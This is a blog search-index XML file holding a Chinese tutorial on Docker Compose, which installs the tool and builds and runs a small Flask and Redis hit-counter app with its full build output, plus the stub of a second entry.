<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/09-docker-rong-qi-fu-wu-bian-pai-li-qi-docker-compose-ying-yong-shi-zhan/docker-rong-qi-fu-wu-bian-pai-li-qi-docker-compose-ying-yong-shi-zhan/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/09-docker-rong-qi-fu-wu-bian-pai-li-qi-docker-compose-ying-yong-shi-zhan/docker-rong-qi-fu-wu-bian-pai-li-qi-docker-compose-ying-yong-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器服务编排利器-Docker-Compose应用实战"><a href="#Docker容器服务编排利器-Docker-Compose应用实战" class="headerlink" title="Docker容器服务编排利器 Docker Compose应用实战"></a>Docker容器服务编排利器 Docker Compose应用实战</h1><h1 id="一、使用Docker-Compose必要性及定义"><a href="#一、使用Docker-Compose必要性及定义" class="headerlink" title="一、使用Docker Compose必要性及定义"></a>一、使用Docker Compose必要性及定义</h1><p>用容器运行一个服务,需要使用<code>docker run</code>命令。但如果我要运行多个服务呢?</p><p>假设我要运行一个web服务,还要运行一个db服务,那么是用一个容器运行,还是用多个容器运行呢?</p><p>一个容器运行多个服务会造成镜像的复杂度提高,<strong>docker倾向于一个容器运行一个应用</strong>。</p><p>那么复杂的架构就会需要很多的容器,并且需要它们之间有关联(容器之间的依赖和连接)就更复杂了。</p><p>这个复杂的问题需要解决,这就涉及到了**==容器编排==**的问题了。</p><ul><li>Compose<ul><li>编排<ul><li>是对多个容器进行启动和管理的方法</li><li>例如：LNMT，先启动MySQL,再启动Tomcat，最后启动Nginx</li></ul></li></ul></li><li>服务架构的演进<ul><li>单体服务架构</li><li>分布式服务架构</li><li>微服务架构</li><li>超微服务架构</li></ul></li><li>容器编排工具<ul><li>docker machine<ul><li>在虚拟机中部署docker容器引擎的工具</li></ul></li><li>docker compose<ul><li>是一个用于定义和运行多容器Docker的应用程序工具</li></ul></li><li>docker swarm<ul><li>是Docker Host主机批量管理及资源调度管理工具</li></ul></li><li>mesos+marathon<ul><li>mesos 对计算机计算资源进行管理和调度</li><li>marathon 服务发现及负载均衡的功能</li></ul></li><li>kubernetes<ul><li>google开源的容器编排工具</li></ul></li></ul></li></ul><h1 id="二、Docker-Compose应用参考资料"><a href="#二、Docker-Compose应用参考资料" class="headerlink" title="二、Docker Compose应用参考资料"></a>二、Docker Compose应用参考资料</h1><ul><li>网址<ul><li><a href="https://docs.docker.com/compose/">https://docs.docker.com/compose/</a></li></ul></li></ul><p>![image-20220215214445753](Docker容器服务编排利器 Docker Compose应用实战.assets/image-20220215214445753.png)</p><ul><li>yaml格式<ul><li><a href="https://yaml.org/">https://yaml.org/</a></li></ul></li></ul><h1 id="三、Docker-Compose应用最佳实践步骤"><a href="#三、Docker-Compose应用最佳实践步骤" class="headerlink" title="三、Docker Compose应用最佳实践步骤"></a>三、Docker Compose应用最佳实践步骤</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><ul><li>工程（project）</li><li>服务 (Service)</li><li>容器 (Container)</li></ul><h2 id="3-2-步骤"><a href="#3-2-步骤" class="headerlink" title="3.2 步骤"></a>3.2 步骤</h2><p>1.定义应用的Dockerfile文件，为了anywhere进行构建。</p><p>2.使用docker-compose.yaml定义一套服务，这套服务可以一起在一个隔离环境中运行。</p><p>3.使用docker-compose up就可以启动整套服务。</p><h1 id="四、Docker-Compose安装"><a href="#四、Docker-Compose安装" class="headerlink" title="四、Docker Compose安装"></a>四、Docker Compose安装</h1><p>![image-20220215215146472](Docker容器服务编排利器 Docker Compose应用实战.assets/image-20220215215146472.png)</p><p>![image-20220215215216047](Docker容器服务编排利器 Docker Compose应用实战.assets/image-20220215215216047.png)</p><p>![image-20220215215239151](Docker容器服务编排利器 Docker Compose应用实战.assets/image-20220215215239151.png)</p><p>![image-20220215215359944](Docker容器服务编排利器 Docker Compose应用实战.assets/image-20220215215359944.png)</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># wget https://github.com/docker/compose/releases/download/v2.2.3/docker-compose-linux-x86_64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mv docker-compose-linux-x86_64 /usr/bin/docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># chmod +x /usr/bin/docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker-compose version</span>Docker Compose version v2<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="五、Docker-Compose应用案例"><a href="#五、Docker-Compose应用案例" class="headerlink" title="五、Docker Compose应用案例"></a>五、Docker Compose应用案例</h1><blockquote><p>运行Python语言开发的网站</p></blockquote><h2 id="5-1-网站文件准备"><a href="#5-1-网站文件准备" class="headerlink" title="5.1 网站文件准备"></a>5.1 网站文件准备</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mkdir flaskproject</span><span class="token namespace">[root@localhost ~]</span><span class="token comment"># cd flaskproject/</span><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># vim app.py</span><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># cat app.py</span>import timeimport redis<span class="token keyword">from</span> flask import Flaskapp = Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>cache = redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host=<span class="token string">'redis'</span><span class="token punctuation">,</span> port=6379<span class="token punctuation">)</span>def get_hit_count<span class="token punctuation">(</span><span class="token punctuation">)</span>:    retries = 5    <span class="token keyword">while</span> True:        <span class="token keyword">try</span>:            <span class="token keyword">return</span> cache<span class="token punctuation">.</span>incr<span class="token punctuation">(</span><span class="token string">'hits'</span><span class="token punctuation">)</span>        except redis<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError as exc:            <span class="token keyword">if</span> retries == 0:                raise exc            retries <span class="token operator">-=</span> 1            time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>0<span class="token punctuation">.</span>5<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>def hello<span class="token punctuation">(</span><span class="token punctuation">)</span>:    count = get_hit_count<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Hello World! I have been seen {} times.\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># vim requirements.txt</span><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># cat requirements.txt</span>flaskredis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-2-Dockerfile文件准备"><a href="#5-2-Dockerfile文件准备" class="headerlink" title="5.2 Dockerfile文件准备"></a>5.2 Dockerfile文件准备</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># vim Dockerfile</span><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># cat Dockerfile</span><span class="token keyword">FROM</span> python:3<span class="token punctuation">.</span>7-alpineWORKDIR <span class="token operator">/</span>codeENV FLASK_APP app<span class="token punctuation">.</span>pyENV FLASK_RUN_HOST 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0RUN apk add <span class="token operator">--</span>no-cache gcc musl-dev linux-headers<span class="token function">COPY</span> requirements<span class="token punctuation">.</span>txt requirements<span class="token punctuation">.</span>txtRUN pip install <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt<span class="token function">COPY</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span>CMD <span class="token punctuation">[</span><span class="token string">"flask"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-3-Compose文件准备"><a href="#5-3-Compose文件准备" class="headerlink" title="5.3 Compose文件准备"></a>5.3 Compose文件准备</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># vim docker-compose.yaml</span><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># cat docker-compose.yaml</span>version: <span class="token string">'3'</span>services:  web:    build: <span class="token punctuation">.</span>    ports:      <span class="token operator">-</span> <span class="token string">"5000:5000"</span>  redis:    image: <span class="token string">"redis:alpine"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-4-使用docker-compose-up启动容器"><a href="#5-4-使用docker-compose-up启动容器" class="headerlink" title="5.4 使用docker-compose up启动容器"></a>5.4 使用docker-compose up启动容器</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># ls</span>app<span class="token punctuation">.</span>py  docker-compose<span class="token punctuation">.</span>yaml  Dockerfile  requirements<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@localhost flaskproject]</span><span class="token comment"># docker-compose up</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">输出：<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Running 7/7 ⠿ redis Pulled                                                                         15<span class="token punctuation">.</span>8s   ⠿ 59bf1c3509f3 Pull complete                                                          2<span class="token punctuation">.</span>9s   ⠿ 719adce26c52 Pull complete                                                          3<span class="token punctuation">.</span>0s   ⠿ b8f35e378c31 Pull complete                                                          5<span class="token punctuation">.</span>8s   ⠿ d034517f789c Pull complete                                                          6<span class="token punctuation">.</span>5s   ⠿ 3772d4d76753 Pull complete                                                          6<span class="token punctuation">.</span>6s   ⠿ 211a7f52febb Pull complete                                                          6<span class="token punctuation">.</span>8sSending build context to Docker daemon     714BStep 1/9 : <span class="token keyword">FROM</span> python:3<span class="token punctuation">.</span>7-alpine3<span class="token punctuation">.</span>7-alpine: Pulling <span class="token keyword">from</span> library/python59bf1c3509f3: Already exists07a400e93df3: Already existsbdabb07397e1: Already existscd0af01c7b70: Already existsd0f18e022200: Already existsDigest: sha256:5a776e3b5336827faf7a1c3a191b73b5b2eef4cdcfe8b94f59b79cb749a2b5d8Status: Downloaded newer image <span class="token keyword">for</span> python:3<span class="token punctuation">.</span>7-alpine <span class="token operator">--</span><span class="token operator">-</span>&gt; e72b511ad78eStep 2/9 : WORKDIR <span class="token operator">/</span>code <span class="token operator">--</span><span class="token operator">-</span>&gt; Running in 2b9d07bef719Removing intermediate container 2b9d07bef719 <span class="token operator">--</span><span class="token operator">-</span>&gt; 7d39e96fadf1Step 3/9 : ENV FLASK_APP app<span class="token punctuation">.</span>py <span class="token operator">--</span><span class="token operator">-</span>&gt; Running in 9bcb28bd632aRemoving intermediate container 9bcb28bd632a <span class="token operator">--</span><span class="token operator">-</span>&gt; 79f656a616d5Step 4/9 : ENV FLASK_RUN_HOST 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 <span class="token operator">--</span><span class="token operator">-</span>&gt; Running in 8470c2dbd6c2Removing intermediate container 8470c2dbd6c2 <span class="token operator">--</span><span class="token operator">-</span>&gt; e212ba688fcdStep 5/9 : RUN apk add <span class="token operator">--</span>no-cache gcc musl-dev linux-headers <span class="token operator">--</span><span class="token operator">-</span>&gt; Running in 6e9ca0766bc8fetch https:<span class="token operator">/</span><span class="token operator">/</span>dl-cdn<span class="token punctuation">.</span>alpinelinux<span class="token punctuation">.</span>org/alpine/v3<span class="token punctuation">.</span>15/main/x86_64/APKINDEX<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gzfetch https:<span class="token operator">/</span><span class="token operator">/</span>dl-cdn<span class="token punctuation">.</span>alpinelinux<span class="token punctuation">.</span>org/alpine/v3<span class="token punctuation">.</span>15/community/x86_64/APKINDEX<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz<span class="token punctuation">(</span>1/13<span class="token punctuation">)</span> Installing libgcc <span class="token punctuation">(</span>10<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1_git20211027-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>2/13<span class="token punctuation">)</span> Installing libstdc+<span class="token operator">+</span> <span class="token punctuation">(</span>10<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1_git20211027-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>3/13<span class="token punctuation">)</span> Installing binutils <span class="token punctuation">(</span>2<span class="token punctuation">.</span>37-r3<span class="token punctuation">)</span><span class="token punctuation">(</span>4/13<span class="token punctuation">)</span> Installing libgomp <span class="token punctuation">(</span>10<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1_git20211027-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>5/13<span class="token punctuation">)</span> Installing libatomic <span class="token punctuation">(</span>10<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1_git20211027-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>6/13<span class="token punctuation">)</span> Installing libgphobos <span class="token punctuation">(</span>10<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1_git20211027-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>7/13<span class="token punctuation">)</span> Installing gmp <span class="token punctuation">(</span>6<span class="token punctuation">.</span>2<span class="token punctuation">.</span>1-r1<span class="token punctuation">)</span><span class="token punctuation">(</span>8/13<span class="token punctuation">)</span> Installing isl22 <span class="token punctuation">(</span>0<span class="token punctuation">.</span>22-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>9/13<span class="token punctuation">)</span> Installing mpfr4 <span class="token punctuation">(</span>4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>0-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>10/13<span class="token punctuation">)</span> Installing mpc1 <span class="token punctuation">(</span>1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>1-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>11/13<span class="token punctuation">)</span> Installing gcc <span class="token punctuation">(</span>10<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1_git20211027-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>12/13<span class="token punctuation">)</span> Installing linux-headers <span class="token punctuation">(</span>5<span class="token punctuation">.</span>10<span class="token punctuation">.</span>41-r0<span class="token punctuation">)</span><span class="token punctuation">(</span>13/13<span class="token punctuation">)</span> Installing musl-dev <span class="token punctuation">(</span>1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>2-r7<span class="token punctuation">)</span>Executing busybox-1<span class="token punctuation">.</span>34<span class="token punctuation">.</span>1-r3<span class="token punctuation">.</span>triggerOK: 143 MiB in 49 packagesRemoving intermediate container 6e9ca0766bc8 <span class="token operator">--</span><span class="token operator">-</span>&gt; 273d4f04dfbcStep 6/9 : <span class="token function">COPY</span> requirements<span class="token punctuation">.</span>txt requirements<span class="token punctuation">.</span>txt <span class="token operator">--</span><span class="token operator">-</span>&gt; daf51c54e8baStep 7/9 : RUN pip install <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt <span class="token operator">--</span><span class="token operator">-</span>&gt; Running in 2aa2d30c5311Collecting flask  Downloading Flask-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>95 kB<span class="token punctuation">)</span>Collecting redis  Downloading redis-4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>173 kB<span class="token punctuation">)</span>Collecting Jinja2&gt;=3<span class="token punctuation">.</span>0  Downloading Jinja2-3<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>133 kB<span class="token punctuation">)</span>Collecting itsdangerous&gt;=2<span class="token punctuation">.</span>0  Downloading itsdangerous-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>18 kB<span class="token punctuation">)</span>Collecting click&gt;=7<span class="token punctuation">.</span>1<span class="token punctuation">.</span>2  Downloading click-8<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>97 kB<span class="token punctuation">)</span>Collecting Werkzeug&gt;=2<span class="token punctuation">.</span>0  Downloading Werkzeug-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>289 kB<span class="token punctuation">)</span>Collecting deprecated&gt;=1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>3  Downloading Deprecated-1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>13-py2<span class="token punctuation">.</span>py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>9<span class="token punctuation">.</span>6 kB<span class="token punctuation">)</span>Collecting packaging&gt;=20<span class="token punctuation">.</span>4  Downloading packaging-21<span class="token punctuation">.</span>3-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>40 kB<span class="token punctuation">)</span>Collecting importlib-metadata&gt;=1<span class="token punctuation">.</span>0  Downloading importlib_metadata-4<span class="token punctuation">.</span>11<span class="token punctuation">.</span>1-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>17 kB<span class="token punctuation">)</span>Collecting wrapt&lt;2<span class="token punctuation">,</span>&gt;=1<span class="token punctuation">.</span>10  Downloading wrapt-1<span class="token punctuation">.</span>13<span class="token punctuation">.</span>3-cp37-cp37m-musllinux_1_1_x86_64<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>78 kB<span class="token punctuation">)</span>Collecting typing-extensions&gt;=3<span class="token punctuation">.</span>6<span class="token punctuation">.</span>4  Downloading typing_extensions-4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>26 kB<span class="token punctuation">)</span>Collecting zipp&gt;=0<span class="token punctuation">.</span>5  Downloading zipp-3<span class="token punctuation">.</span>7<span class="token punctuation">.</span>0-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>5<span class="token punctuation">.</span>3 kB<span class="token punctuation">)</span>Collecting MarkupSafe&gt;=2<span class="token punctuation">.</span>0  Downloading MarkupSafe-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1-cp37-cp37m-musllinux_1_1_x86_64<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>30 kB<span class="token punctuation">)</span>Collecting pyparsing!=3<span class="token punctuation">.</span>0<span class="token punctuation">.</span>5<span class="token punctuation">,</span>&gt;=2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2  Downloading pyparsing-3<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7-py3-none-any<span class="token punctuation">.</span>whl <span class="token punctuation">(</span>98 kB<span class="token punctuation">)</span>Installing collected packages: zipp<span class="token punctuation">,</span> typing-extensions<span class="token punctuation">,</span> wrapt<span class="token punctuation">,</span> pyparsing<span class="token punctuation">,</span> MarkupSafe<span class="token punctuation">,</span> importlib-metadata<span class="token punctuation">,</span> Werkzeug<span class="token punctuation">,</span> packaging<span class="token punctuation">,</span> Jinja2<span class="token punctuation">,</span> itsdangerous<span class="token punctuation">,</span> deprecated<span class="token punctuation">,</span> click<span class="token punctuation">,</span> redis<span class="token punctuation">,</span> flaskSuccessfully installed Jinja2-3<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3 MarkupSafe-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1 Werkzeug-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3 click-8<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3 deprecated-1<span class="token punctuation">.</span>2<span class="token punctuation">.</span>13 flask-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3 importlib-metadata-4<span class="token punctuation">.</span>11<span class="token punctuation">.</span>1 itsdangerous-2<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1 packaging-21<span class="token punctuation">.</span>3 pyparsing-3<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7 redis-4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3 typing-extensions-4<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 wrapt-1<span class="token punctuation">.</span>13<span class="token punctuation">.</span>3 zipp-3<span class="token punctuation">.</span>7<span class="token punctuation">.</span>0WARNING: Running pip as the <span class="token string">'root'</span> user can result in broken permissions and conflicting behaviour with the system package manager<span class="token punctuation">.</span> It is recommended to use a virtual environment instead: https:<span class="token operator">/</span><span class="token operator">/</span>pip<span class="token punctuation">.</span>pypa<span class="token punctuation">.</span>io/warnings/venvWARNING: You are <span class="token keyword">using</span> pip version 21<span class="token punctuation">.</span>2<span class="token punctuation">.</span>4<span class="token punctuation">;</span> however<span class="token punctuation">,</span> version 22<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3 is available<span class="token punctuation">.</span>You should consider upgrading via the <span class="token string">'/usr/local/bin/python -m pip install --upgrade pip'</span> command<span class="token punctuation">.</span>Removing intermediate container 2aa2d30c5311 <span class="token operator">--</span><span class="token operator">-</span>&gt; dd8f52b132f8Step 8/9 : <span class="token function">COPY</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token operator">--</span><span class="token operator">-</span>&gt; b36938a26cf5Step 9/9 : CMD <span class="token punctuation">[</span><span class="token string">"flask"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">]</span> <span class="token operator">--</span><span class="token operator">-</span>&gt; Running in 260cbfa02959Removing intermediate container 260cbfa02959 <span class="token operator">--</span><span class="token operator">-</span>&gt; fa04dfec6ff2Successfully built fa04dfec6ff2Successfully tagged flaskproject_web:latestUse <span class="token string">'docker scan'</span> to run Snyk tests against images to find vulnerabilities and learn how to fix them<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Running 3/3 ⠿ Network flaskproject_default    Created                                               0<span class="token punctuation">.</span>1s ⠿ Container flaskproject-redis-1  Created                                               0<span class="token punctuation">.</span>1s ⠿ Container flaskproject-web-1    Created                                               0<span class="token punctuation">.</span>1sAttaching to flaskproject-redis-1<span class="token punctuation">,</span> flaskproject-web-1flaskproject-redis-1  <span class="token punctuation">|</span> 1:C 15 Feb 2022 14:14:21<span class="token punctuation">.</span>696 <span class="token comment"># oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:C 15 Feb 2022 14:14:21<span class="token punctuation">.</span>696 <span class="token comment"># Redis version=6.2.6, bits=64, commit=00000000, modified=0, pid=1, just started</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:C 15 Feb 2022 14:14:21<span class="token punctuation">.</span>696 <span class="token comment"># Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:M 15 Feb 2022 14:14:21<span class="token punctuation">.</span>697 <span class="token operator">*</span> monotonic clock: POSIX clock_gettimeflaskproject-redis-1  <span class="token punctuation">|</span> 1:M 15 Feb 2022 14:14:21<span class="token punctuation">.</span>698 <span class="token operator">*</span> Running mode=standalone<span class="token punctuation">,</span> port=6379<span class="token punctuation">.</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:M 15 Feb 2022 14:14:21<span class="token punctuation">.</span>698 <span class="token comment"># WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:M 15 Feb 2022 14:14:21<span class="token punctuation">.</span>698 <span class="token comment"># Server initialized</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:M 15 Feb 2022 14:14:21<span class="token punctuation">.</span>698 <span class="token comment"># WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.</span>flaskproject-redis-1  <span class="token punctuation">|</span> 1:M 15 Feb 2022 14:14:21<span class="token punctuation">.</span>698 <span class="token operator">*</span> Ready to accept connectionsflaskproject-web-1    <span class="token punctuation">|</span>  <span class="token operator">*</span> Serving Flask app <span class="token string">'app.py'</span> <span class="token punctuation">(</span>lazy loading<span class="token punctuation">)</span>flaskproject-web-1    <span class="token punctuation">|</span>  <span class="token operator">*</span> Environment: productionflaskproject-web-1    <span class="token punctuation">|</span>    WARNING: This is a development server<span class="token punctuation">.</span> <span class="token keyword">Do</span> not use it in a production deployment<span class="token punctuation">.</span>flaskproject-web-1    <span class="token punctuation">|</span>    Use a production WSGI server instead<span class="token punctuation">.</span>flaskproject-web-1    <span class="token punctuation">|</span>  <span class="token operator">*</span> Debug mode: offflaskproject-web-1    <span class="token punctuation">|</span>  <span class="token operator">*</span> Running on all addresses<span class="token punctuation">.</span>flaskproject-web-1    <span class="token punctuation">|</span>    WARNING: This is a development server<span class="token punctuation">.</span> <span class="token keyword">Do</span> not use it in a production deployment<span class="token punctuation">.</span>flaskproject-web-1    <span class="token punctuation">|</span>  <span class="token operator">*</span> Running on http:<span class="token operator">/</span><span class="token operator">/</span>172<span class="token punctuation">.</span>18<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2:5000/ <span class="token punctuation">(</span>Press CTRL+C to quit<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-5-访问"><a href="#5-5-访问" class="headerlink" title="5.5 访问"></a>5.5 访问</h2><p>![image-20220215221648195](Docker容器服务编排利器 Docker Compose应用实战.assets/image-20220215221648195.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/08-docker-rong-qi-shu-ju-chi-jiu-hua-cun-chu-ji-zhi/docker-rong-qi-shu-ju-chi-jiu-hua-cun-chu-ji-zhi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/08-docker-rong-qi-shu-ju-chi-jiu-hua-cun-chu-ji-zhi/docker-rong-qi-shu-ju-chi-jiu-hua-cun-chu-ji-zhi/</url>
      
